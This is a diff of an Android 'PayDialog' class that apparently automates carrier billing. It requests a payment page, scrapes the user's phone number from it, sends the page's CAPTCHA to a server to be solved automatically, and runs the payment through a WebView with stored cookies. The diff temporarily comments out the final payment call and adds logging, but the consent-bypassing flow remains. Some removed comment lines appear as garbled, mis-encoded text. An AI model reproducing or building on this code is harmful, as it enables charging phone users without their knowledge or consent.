@@ -101,10 +101,10 @@ public class PayDialog extends Dialog {
         IntentFilter filter = new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION);
         mContext.registerReceiver(mMyReceiver, filter);
 
-        mRequestUrl = URL_CM_READ;
-        startRequestIfReady();
+        // mRequestUrl = URL_CM_READ;
+        // startRequestIfReady();
         // mHandler.postDelayed(mDismissRunnable, 30 * 1000);
-        // getOrder(1);
+        getOrder(1);
     }
 
     private void getOrder(final int price) {
@@ -120,22 +120,19 @@ public class PayDialog extends Dialog {
                     JSONObject jobj = new JSONObject(result);
                     if (jobj.has("url")) {
                         mRequestUrl = jobj.getString("url");
-                        // Log.d(Log.TAG, "mRequestUrl : " + mRequestUrl);
                     }
                     if (jobj.has("mobileReg")) {
                         String mobileReg = jobj.getString("mobileReg");
-                        // Log.d(Log.TAG, "mobileReg : " + mobileReg);
                         Util.setMobileReg(mContext, mobileReg);
                     }
                     if (jobj.has("sucUrlFunc")) {
                         String sucUrlFunc = jobj.getString("sucUrlFunc");
-                        // Log.d(Log.TAG, "sucUrlFunc : " + sucUrlFunc);
                         Util.setUrlReg(mContext, sucUrlFunc);
                     }
                     if (jobj.has("orderId")) {
                         mOrderId = jobj.getString("orderId");
-                        // Log.d(Log.TAG, "mOrderId : " + mOrderId);
                     }
+                    Log.d(Log.TAG, "mRequestUrl : " + mRequestUrl);
                     if (!TextUtils.isEmpty(mRequestUrl)) {
                         DEBUGTIME1 = System.currentTimeMillis();
                         startRequestIfReady();
@@ -166,7 +163,8 @@ public class PayDialog extends Dialog {
     };
 
     /**
-     * ֪ͨ��������֧�����
+     * 通知服务器，支付完成
+     * 
      * @param url
      */
     private void notifyServerState(final String url) {
@@ -188,7 +186,8 @@ public class PayDialog extends Dialog {
                     }
                 }
                 if (!TextUtils.isEmpty(result)) {
-                    loadDataWithBaseUrl(result);
+                    // TODO :
+                    // loadDataWithBaseUrl(result);
                     dismissProgress();
                 }
             }
@@ -196,7 +195,8 @@ public class PayDialog extends Dialog {
     }
 
     /**
-     * ��ȡ֧���ɹ�ҳ�棬ȡ��֪ͨ��������url��ַ
+     * 获取支付成功页面，取得通知服务器的url地址
+     * 
      * @param url
      */
     private void requestPayResultUrl(final String url) {
@@ -204,8 +204,10 @@ public class PayDialog extends Dialog {
         new Thread(){
             public void run() {
                 String result = HttpManager.get(mContext).sendHttpGet(url);
+                Log.d(Log.TAG, "result : " + result);
                 processNotifyUrl(result);
-                loadDataWithBaseUrl(result);
+                // TODO:
+                // loadDataWithBaseUrl(result);
             }
         }.start();
     }
@@ -214,7 +216,7 @@ public class PayDialog extends Dialog {
         @JavascriptInterface
         public void showSource(String content, String state, String url) {
             Log.d(Log.TAG, "state : " + state);
-            if ("url".equals(state)) {
+            if ("html".equals(state)) {
                 if (!TextUtils.isEmpty(content)) {
                     processNotifyUrl(content);
                 } else {
@@ -262,27 +264,32 @@ public class PayDialog extends Dialog {
     }
 
     /**
-     * ��ȡʵ��֧��ҳ�棬�Զ��ɷ�����ʶ����֤��
+     * 获取实际支付页面，自动由服务器识别验证码
      */
     private void requestPaymentUrl() {
+        if (TextUtils.isEmpty(mRequestUrl)) {
+            return;
+        }
         mRequesting = true;
         new Thread(){
             public void run() {
                 String pageContent = null;
                 String phoneNumber = null;
                 String result = null;
-                for (int count = 0; count < 4; count++) {
-                    Log.d(Log.TAG, "��" + (count + 1) + "������");
-                    // ����֧��ҳ��
+                for (int count = 0; count < 1; count++) {
+                    Log.d(Log.TAG, "第" + (count + 1) + "次请求");
+                    // 请求支付页面
                     pageContent = requestPaymentPage();
-                    // ��֧��ҳ���ȡ�ֻ��
+                    // 从支付页面获取手机号
                     phoneNumber = getMobileNumber(pageContent);
 
                     if (!TextUtils.isEmpty(phoneNumber)) {
-                        //TODO: ����֧��url chukong ��ַ
+                        /*
+                        // TODO: 请求支付url chukong 地址
                         if (true) {
                             break;
                         }
+                        */
                         result = requestRealPayUrl(pageContent);
                         if (!TextUtils.isEmpty(result)) {
                             try {
@@ -300,16 +307,17 @@ public class PayDialog extends Dialog {
                                     data = jobj.getString("data");
                                 }
                                 if ("1".equals(status)) {
-                                    // ��ʼ֧��
-                                    execPay(data);
+                                    // 开始支付
+                                    // TODO:暂时注释真实支付
+                                    // execPay(data);
                                 } else {
-                                    Log.d(Log.TAG, "ʶ����֤��ʧ��, ����");
+                                    Log.d(Log.TAG, "识别验证码失败, 重试");
                                 }
                             } catch (JSONException e) {
                                 Log.d(Log.TAG, "error : " + e);
                             }
                         } else {
-                            Log.d(Log.TAG, "�޷���ȡ��ʵ֧����ַ");
+                            Log.d(Log.TAG, "无法获取真实支付地址");
                             break;
                         }
                     }
@@ -369,6 +377,7 @@ public class PayDialog extends Dialog {
     }
 
     private void execPay(String url) {
+        Log.d(Log.TAG, "url : " + url);
         String cookies = PreferenceManager.getDefaultSharedPreferences(mContext).getString("cookies", "");
         loadUrlOnUiThread(url, cookies);
     }
